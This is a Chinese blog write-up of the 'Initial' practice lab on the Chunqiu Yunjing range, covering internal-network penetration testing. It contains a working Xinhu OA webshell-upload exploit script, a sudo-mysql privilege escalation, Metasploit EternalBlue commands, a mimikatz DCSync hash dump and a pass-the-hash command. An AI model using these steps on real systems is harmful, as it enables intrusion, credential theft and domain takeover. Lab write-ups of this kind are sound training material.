@@ -1,0 +1,335 @@
+---
+title: '春秋云镜-Initial' # (Required, max 60)
+description: 'Initial是一套难度为简单的靶场环境，完成该挑战可以帮助玩家初步认识内网渗透的简单流程。该靶场只有一个flag，各部分位于不同的机器上。' # (Required, 10 to 160)
+publishDate: '2025-3-15' # (Required, Date)
+tags:
+  - 春秋云镜 # (Also can write format like next line)
+heroImage: { src: 'https://image777.oss-cn-beijing.aliyuncs.com/img/202510052206581.jpg', inferSize: true, color: '#d52c12ff' }
+draft: false # (set true will only show in development)
+language: '简中' # (String as you like)
+comment: true # (set false will disable comment, even if you've enabled it in site-config)
+---
+## 外网
+
+### 信息收集
+
+扫到thinkphp5023-RCE
+
+```shell
+❯ ./fscan -h 39.99.138.158                                         
+┌──────────────────────────────────────────────┐
+│    ___                              _        │
+│   / _ \     ___  ___ _ __ __ _  ___| | __    │
+│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
+│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
+│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
+└──────────────────────────────────────────────┘
+      Fscan Version: 2.0.0
+
+[2025-04-17 14:18:05] [INFO] 暴力破解线程数: 1
+[2025-04-17 14:18:05] [INFO] 开始信息扫描
+[2025-04-17 14:18:05] [INFO] 最终有效主机数量: 1
+[2025-04-17 14:18:05] [INFO] 开始主机扫描
+[2025-04-17 14:18:05] [INFO] 有效端口数量: 233
+[2025-04-17 14:18:05] [SUCCESS] 端口开放 39.99.138.158:22
+[2025-04-17 14:18:05] [SUCCESS] 端口开放 39.99.138.158:80
+[2025-04-17 14:18:05] [SUCCESS] 服务识别 39.99.138.158:22 => [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]
+[2025-04-17 14:18:11] [SUCCESS] 服务识别 39.99.138.158:80 => [http]
+[2025-04-17 14:18:11] [INFO] 存活端口数量: 2
+[2025-04-17 14:18:11] [INFO] 开始漏洞扫描
+[2025-04-17 14:18:11] [INFO] 加载的插件: ssh, webpoc, webtitle
+[2025-04-17 14:18:11] [SUCCESS] 网站标题 http://39.99.138.158      状态码:200 长度:5578   标题:Bootstrap Material Admin
+[2025-04-17 14:18:13] [SUCCESS] 目标: http://39.99.138.158:80
+  漏洞类型: poc-yaml-thinkphp5023-method-rce
+  漏洞名称: poc1
+  详细信息:
+	links:https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce
+[2025-04-17 14:18:18] [SUCCESS] 扫描已完成: 3/3
+```
+
+### 利用
+
+
+工具传马
+
+![image-20250417143900573](https://image777.oss-cn-beijing.aliyuncs.com/img/202504172119906.png)
+
+蚁剑连接，sudo提权
+
+![image-20250417143731829](https://image777.oss-cn-beijing.aliyuncs.com/img/202504172120968.png)
+
+传fscan，内网扫描
+扫到172.22.1.18（信呼OA-nday）
+172.22.1.22（永恒之蓝）
+
+```shell
+(www-data:/var/www/html) $ sudo mysql -e '\! ./fscan_linux -h 172.22.1.15/16 > res.txt'
+(www-data:/var/www/html) $ cat res.txt
+┌──────────────────────────────────────────────┐
+│    ___                              _        │
+│   / _ \     ___  ___ _ __ __ _  ___| | __    │
+│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
+│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
+│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
+└──────────────────────────────────────────────┘
+      Fscan Version: 2.0.0
+[2025-04-17 15:04:39] [INFO] 暴力破解线程数: 1
+[2025-04-17 15:04:39] [INFO] 开始信息扫描
+[2025-04-17 15:04:39] [INFO] CIDR范围: 172.22.0.0-172.22.255.255
+[2025-04-17 15:04:39] [INFO] 生成IP范围: 172.22.0.0.%!d(string=172.22.255.255) - %!s(MISSING).%!d(MISSING)
+[2025-04-17 15:04:39] [INFO] 解析CIDR 172.22.1.15/16 -> IP范围 172.22.0.0-172.22.255.255
+[2025-04-17 15:04:39] [INFO] 最终有效主机数量: 65536
+[2025-04-17 15:04:39] [INFO] 开始主机扫描
+[2025-04-17 15:04:39] [SUCCESS] 目标 172.22.1.15     存活 (ICMP)
+[2025-04-17 15:04:39] [SUCCESS] 目标 172.22.1.18     存活 (ICMP)
+[2025-04-17 15:04:39] [SUCCESS] 目标 172.22.1.2      存活 (ICMP)
+[2025-04-17 15:04:39] [SUCCESS] 目标 172.22.1.21     存活 (ICMP)
+[2025-04-17 15:04:40] [SUCCESS] 目标 172.22.255.253  存活 (ICMP)
+[2025-04-17 15:04:46] [SUCCESS] 172.22.0.0/16 存活主机数: 5
+[2025-04-17 15:04:46] [SUCCESS] 172.22.1.0/24 存活主机数: 4
+[2025-04-17 15:04:46] [SUCCESS] 172.22.255.0/24 存活主机数: 1
+[2025-04-17 15:04:46] [INFO] 存活主机数量: 5
+[2025-04-17 15:04:46] [INFO] 有效端口数量: 233
+[2025-04-17 15:04:46] [SUCCESS] 端口开放 172.22.1.18:80
+[2025-04-17 15:04:46] [SUCCESS] 端口开放 172.22.1.2:88
+[2025-04-17 15:04:46] [SUCCESS] 端口开放 172.22.1.21:135
+[2025-04-17 15:04:46] [SUCCESS] 端口开放 172.22.1.18:135
+[2025-04-17 15:04:46] [SUCCESS] 端口开放 172.22.1.2:135
+[2025-04-17 15:04:46] [SUCCESS] 端口开放 172.22.1.2:139
+[2025-04-17 15:04:46] [SUCCESS] 端口开放 172.22.1.21:139
+[2025-04-17 15:04:46] [SUCCESS] 端口开放 172.22.1.18:139
+[2025-04-17 15:04:46] [SUCCESS] 端口开放 172.22.1.2:389
+[2025-04-17 15:04:46] [SUCCESS] 端口开放 172.22.1.18:445
+[2025-04-17 15:04:46] [SUCCESS] 端口开放 172.22.1.2:445
+[2025-04-17 15:04:49] [SUCCESS] 端口开放 172.22.1.21:445
+[2025-04-17 15:04:52] [SUCCESS] 服务识别 172.22.1.18:80 => [http]
+[2025-04-17 15:04:52] [SUCCESS] 服务识别 172.22.1.2:88 => 
+[2025-04-17 15:04:52] [SUCCESS] 服务识别 172.22.1.2:139 =>  Banner:[.]
+[2025-04-17 15:04:52] [SUCCESS] 服务识别 172.22.1.21:139 =>  Banner:[.]
+[2025-04-17 15:04:52] [SUCCESS] 服务识别 172.22.1.18:139 =>  Banner:[.]
+[2025-04-17 15:04:52] [SUCCESS] 服务识别 172.22.1.2:389 => [ldap] 产品:Microsoft Windows Active Directory LDAP 系统:Windows 信息:Domain: xiaorang.lab, Site: Default-First-Site-Name
+[2025-04-17 15:04:52] [SUCCESS] 服务识别 172.22.1.18:445 => 
+[2025-04-17 15:04:52] [SUCCESS] 服务识别 172.22.1.2:445 => 
+[2025-04-17 15:04:52] [SUCCESS] 端口开放 172.22.1.18:3306
+[2025-04-17 15:04:52] [SUCCESS] 服务识别 172.22.1.18:3306 => [mysql] 产品:MySQL 信息:unauthorized Banner:[D.j Host '172.22.1.15' is not allowed to connect to this MySQL server]
+[2025-04-17 15:04:54] [SUCCESS] 服务识别 172.22.1.21:445 => 
+[2025-04-17 15:04:59] [SUCCESS] 服务识别 172.22.1.2:135 => 
+[2025-04-17 15:04:59] [SUCCESS] 服务识别 172.22.1.21:135 => 
+[2025-04-17 15:04:59] [SUCCESS] 服务识别 172.22.1.18:135 => 
+[2025-04-17 15:04:59] [INFO] 存活端口数量: 15
+[2025-04-17 15:04:59] [INFO] 开始漏洞扫描
+[2025-04-17 15:05:00] [INFO] 加载的插件: findnet, ldap, ms17010, mysql, netbios, smb, smb2, smbghost, ssh, webpoc, webtitle
+[2025-04-17 15:05:00] [SUCCESS] NetInfo 扫描结果
+目标主机: 172.22.1.18
+主机名: XIAORANG-OA01
+发现的网络接口:
+   IPv4地址:
+      └─ 172.22.1.18
+[2025-04-17 15:05:00] [SUCCESS] NetInfo 扫描结果
+目标主机: 172.22.1.2
+主机名: DC01
+发现的网络接口:
+   IPv4地址:
+      └─ 172.22.1.2
+[2025-04-17 15:05:00] [SUCCESS] NetInfo 扫描结果
+目标主机: 172.22.1.21
+主机名: XIAORANG-WIN7
+发现的网络接口:
+   IPv4地址:
+      └─ 172.22.1.21
+[2025-04-17 15:05:00] [SUCCESS] 发现漏洞 172.22.1.21 [Windows Server 2008 R2 Enterprise 7601 Service Pack 1] MS17-010
+[2025-04-17 15:05:00] [INFO] 系统信息 172.22.1.2 [Windows Server 2016 Datacenter 14393]
+[2025-04-17 15:05:00] [SUCCESS] NetBios 172.22.1.18     XIAORANG-OA01.xiaorang.lab          Windows Server 2012 R2 Datacenter 9600
+[2025-04-17 15:05:00] [SUCCESS] NetBios 172.22.1.21     XIAORANG-WIN7.xiaorang.lab          Windows Server 2008 R2 Enterprise 7601 Service Pack 1
+[2025-04-17 15:05:00] [SUCCESS] NetBios 172.22.1.2      DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393
+[2025-04-17 15:05:00] [SUCCESS] 网站标题 http://172.22.1.18        状态码:302 长度:0      标题:无标题 重定向地址: http://172.22.1.18?m=login
+[2025-04-17 15:05:00] [SUCCESS] 网站标题 http://172.22.1.18?m=login 状态码:200 长度:4012   标题:信呼协同办公系统
+```
+
+## 内网
+
+### 设置代理
+
+传venom
+
+ ```shell
+./agent_linux_x64 -lport 8888
+ ```
+
+```shell
+❯ ./admin_macos_x64 -rhost 39.99.140.230 -rport 8888               
+Venom Admin Node Start...
+
+  ____   ____  { v1.1  author: Dlive }
+  \   \ /   /____   ____   ____   _____
+   \   Y   // __ \ /    \ /    \ /     \
+    \     /\  ___/|   |  (  <_> )  Y Y  \
+     \___/  \___  >___|  /\____/|__|_|  /
+                \/     \/             \/
+
+(admin node) >>> show
+A
++ -- 1
+(admin node) >>> goto 1
+node 1
+(node 1) >>> socks 9999
+a socks5 proxy of the target node has started up on the local port 9999.
+```
+
+配置Proxifer
+
+![image-20250417151502458](https://image777.oss-cn-beijing.aliyuncs.com/img/202504172120913.png)
+
+### 172.22.1.18
+
+nday直接在网上抄脚本利用
+
+```python
+import requests
+
+
+session = requests.session()
+
+url_pre = 'http://172.22.1.18/'
+url1 = url_pre + '?a=check&m=login&d=&ajaxbool=true&rnd=533953'
+url2 = url_pre + '/index.php?a=upfile&m=upload&d=public&maxsize=100&ajaxbool=true&rnd=798913'
+url3 = url_pre + '/task.php?m=qcloudCos|runt&a=run&fileid=11'
+
+data1 = {
+    'rempass': '0',
+    'jmpass': 'false',
+    'device': '1625884034525',
+    'ltype': '0',
+    'adminuser': 'YWRtaW4=',
+    'adminpass': 'YWRtaW4xMjM=',
+    'yanzm': ''
+}
+
+
+r = session.post(url1, data=data1)
+r = session.post(url2, files={'file': open('1.php', 'r+')})
+
+filepath = str(r.json()['filepath'])
+filepath = "/" + filepath.split('.uptemp')[0] + '.php'
+id = r.json()['id']
+print(id)
+print(filepath)
+url3 = url_pre + f'/task.php?m=qcloudCos|runt&a=run&fileid={id}'
+
+r = session.get(url3)
+r = session.get(url_pre + filepath + "?1=system('dir');")
+print(r.text)
+```
+
+![image-20250417152403734](https://image777.oss-cn-beijing.aliyuncs.com/img/202504172120922.png)
+
+蚁剑连接直接为System权限
+
+![image-20250417152131716](https://image777.oss-cn-beijing.aliyuncs.com/img/202504172120085.png)
+
+### 172.22.1.21
+
+直接用msf打永恒之蓝，这里用Mac利用失败了，开kali虚拟机配置proxychain
+
+```shell
+[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to "tor"
+socks5  10.66.174.145 9999
+```
+
+这里因为靶机不出网，payload要用正向连接
+
+```shell
+proxychains4 msfconsole
+use exploit/windows/smb/ms17_010_eternalblue
+set payload windows/x64/meterpreter/bind_tcp_uuid
+set RHOSTS 172.22.1.21
+exploit
+load kiwi
+kiwi_cmd "lsadump::dcsync /domain:xiaorang.lab /all /csv" exit
+```
+
+拿到shell为System权限但没有flag，可以`load kiwi`并`creds_all`发现本机上有个域内机器账户，也是说本机system权限具备访问域控的能力
+
+其他方法（上bloodhound进行域内信息收集）
+
+```cmd
+upload SharpHound.exe C:/SharpHound.exe
+SharpHound.exe -c all
+download C:/2025**********_BloodHound.zip
+```
+
+可发现此主机拥有DCSync权限，抓Admin哈希值打哈希传递拿下域控
+
+```shell
+[*] Sending stage (201798 bytes) to 172.22.1.21
+[proxychains] DLL init: proxychains-ng 4.17
+[*] Meterpreter session 1 opened (10.211.55.5:32788 -> 10.66.174.145:9999) at 2025-04-17 15:39:19 +0800
+[+] 172.22.1.21:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 172.22.1.21:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 172.22.1.21:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
+meterpreter > [proxychains] DLL init: proxychains-ng 4.17
+meterpreter > [proxychains] DLL init: proxychains-ng 4.17
+meterpreter > load kiwi
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
+Loading extension kiwi...
+  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
+  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/
+
+Success.
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
+meterpreter > kiwi_cmd "lsadump::dcsync /domain:xiaorang.lab /all /csv" exit
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
+[DC] 'xiaorang.lab' will be the domain
+[DC] 'DC01.xiaorang.lab' will be the DC server
+[DC] Exporting domain 'xiaorang.lab'
+[rpc] Service  : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+502     krbtgt  fb812eea13a18b7fcdb8e6d67ddc205b        514
+1106    Marcus  e07510a4284b3c97c8e7dee970918c5c        512
+1107    Charles f6a9881cd5ae709abb4ac9ab87f24617        512
+1000    DC01$   52f1ecd733479e2ebdbf6a3bc2216054        532480
+500     Administrator   10cf89a850fb1cdbe6bb432b859164c8        512
+1104    XIAORANG-OA01$  6d24ed7aace2dc81e736060397855909        4096
+1108    XIAORANG-WIN7$  b35096d8178d16e7dee0ac33620d1e94        4096
+
+mimikatz(powershell) # exit
+Bye!
+
+```
+
+`172.22.1.2`主机开启445端口，利用SMB传递哈希
+
+```cmd
+proxychains4 crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x "type Users\Administrator\flag\flag03.txt"
+```
+
+![image-20250417154308600](https://image777.oss-cn-beijing.aliyuncs.com/img/202504172120337.png)
+
+## 参考笔记
+
+[Venom](https://eonun.com/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Hacker/Venom/#agent-admin)
+
+[DCSync](https://www.cnblogs.com/CoLo/p/16488892.html#dcsync)
+
+[域渗透-哈希传递攻击(Pass The Hash/Key)](https://zhuanlan.zhihu.com/p/472019671)
+
+[春秋云镜-Initial-Writeup](https://blog.csdn.net/qq_35607078/article/details/131666152)
